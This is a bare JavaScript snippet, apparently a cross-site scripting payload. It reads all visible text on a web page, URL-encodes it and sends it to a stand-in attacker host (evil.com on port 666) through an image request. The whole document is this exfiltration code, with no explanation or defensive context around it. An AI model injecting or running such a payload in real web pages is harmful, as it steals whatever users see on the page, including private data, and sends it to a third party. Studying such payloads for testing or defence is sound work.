var data = document.body.innerText;
console.log(data);
var payload = encodeURIComponent(data);
var img = new Image();
img.src = `https://evil.com:666/hijack?payload=${payload}`;
